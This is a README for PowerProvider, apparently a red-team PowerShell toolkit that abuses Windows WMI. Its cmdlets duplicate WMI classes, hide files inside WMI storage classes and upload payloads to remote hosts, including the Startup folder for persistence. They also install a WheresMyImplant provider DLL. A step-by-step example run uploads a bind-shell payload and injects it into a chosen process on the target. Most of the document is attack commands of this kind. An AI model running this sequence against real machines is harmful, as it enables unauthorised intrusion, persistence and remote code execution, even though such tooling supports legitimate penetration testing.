## PowerProvider

PowerProvider: A toolkit to manipulate WMI. This toolkit provides functionality to:
* Duplicate Classes
* Create static classes for file storage
* Remote Install WMI Providers

Primarily used in conjunction with WheresMyImplant - https://github.com/0xbadjuju/WheresMyImplant/

### Methods
#### Class Duplication
  * **Invoke-WMIDuplicateClass**
    * Invoke-WMIDuplicateClass -TargetClassName Win32_Process -DuplicateClassName Win32_Create -ComputerName $ComputerName -Credential $Credential

#### File Transfer
  * **Invoke-WMIUpload**
    * $Destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    * Invoke-WMIUpload -PayloadPath C:\Payload.exe -Destination $Destination -PayloadName Payload.exe -ComputerName  $ComputerName -Credential $Credential
    * Invoke-WMIUpload -PayloadPath C:\Payload.exe -Inject -PayloadName Payload.exe -ComputerName  $ComputerName -Credential $Credential
  * **Invoke-WMIRemoteExtract**
    * $Destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    * Invoke-WMIRemoteExtract -PayloadName Payload.exe -Destination $Destination -ComputerName  $ComputerName -Credential $Credential

#### File Storage
  * **New-WMIFSClass**
    * New-WMIFSClass -ComputerName $ComputerName -Credential $Credential
  * **ConvertTo-Base64**
    * $File = ConvertTo-Base64 -FileName C:\Payload.exe -Inject
  * **Invoke-InsertFileThreaded**
    * Invoke-InsertFileThreaded -EncodedText $File -FileName Payload.exe -ComputerName $ComputerName -Credential $Credential -Verbose
  * **Invoke-RetrieveFile**
    * $File = Invoke-RetrieveFile -FileName C:\Payload.exe -ComputerName $ComputerName -Credential $Credential
  * **ConvertFrom-Base64**
    * $FileBytes = ConvertFrom-Base64 -ComputerName $ComputerName -Credential $Credential
  * **ConvertTo-EncryptedText**
    * $EncryptedString = ConvertTo-EncryptedText -PlaintextString $File
  * **ConvertFrom-EncryptedText**
    * $File = ConvertFrom-EncryptedText -EncryptedString $EncryptedString
    
#### Provider Install
  * **Install-WMIProviderInstallUtil**
    * Install-WMIProviderInstallUtil -LibraryLocation C:\Windows\System32\wbem\WheresMysImplant.dll -ComputerName $ComputerName -Credential $Credential
  * **Install-WMIProviderPowerShell**
    * Install-WMIProviderPowerShell -LibraryLocation C:\Windows\System32\wbem\WheresMysImplant.dll -ComputerName $ComputerName -Credential $Credential
  * **Install-WMIProviderExtention**
    * Install-WMIProvider -LocalLibraryLocation C:\WheresMyImplant.dll -ComputerName $ComputerName -Credential $Credential
  * **Uninstall-WMIProviderExtention**
    * Uninstall-WMIProvider -ProviderName WheresMyImplant -ClassName Win32_Implant C:\WheresMy -ComputerName $ComputerName -Credential $Credential

#### Example Run

**Upload the provider to the target host** <br/>
Invoke-WMIUpload -PayloadPath C:\WheresMyImplant.dll -PayloadName WheresMyImplant.dll -Destination C:\Windows\System32\wbem -ComputerName $ComputerName -Credential $Credential -Verbose

**Register the provider on the target host** <br/>
Install-WMIProviderExtention -LocalLibraryLocation C:\WheresMyImplant.dll -ComputerName $ComputerName -Credential $Credential -Verbose

**Upload the payload to the target host** <br/>
Invoke-WMIUpload -PayloadPath C:\bind64.exe -PayloadName bind64.exe -ComputerName $ComputerName -Credential $Credential -Inject -Verbose

**Get the argumentlist order** <br/>
(Get-WmiObject -List -Class Win32_Implant -ComputerName $ComputerName -Credential $Credential).Methods["InjectPeWMIFS"].InParameters

**Find a process to inject into** <br/>
Get-WmiObject Win32_Process | Select Name, ProcessId

**Inject into process and run payload** <br/>
Invoke-WmiMethod -Class Win32_Implant -Name InjectPeWMIFS -ArgumentList "bind64.exe", "", 4596, "WMIFS" -ComputerName $ComputerName -Credential $Credential

### Author, Contributors, and License

##### Author: Alexander Leary (@0xbadjuju), NetSPI - 2017

##### License: BSD 3-Clause

##### Required Dependencies: None
